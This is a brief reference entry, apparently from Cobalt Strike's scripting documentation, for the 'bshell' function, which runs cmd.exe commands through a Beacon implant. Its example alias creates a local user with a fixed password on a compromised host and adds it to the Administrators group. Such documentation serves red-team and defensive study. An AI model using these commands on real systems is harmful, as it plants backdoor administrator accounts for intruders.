bshell

Ask Beacon to run a command with cmd.exe

#### Arguments

`$1` - the id for the beacon. This may be an array or a single ID.

`$2` - the command and arguments to run

#### Example

```
alias adduser {
   bshell($1, "net user $2 B00gyW00gy1234! /ADD");
   bshell($1, "net localgroup \"Administrators\" $2 /ADD");
}```
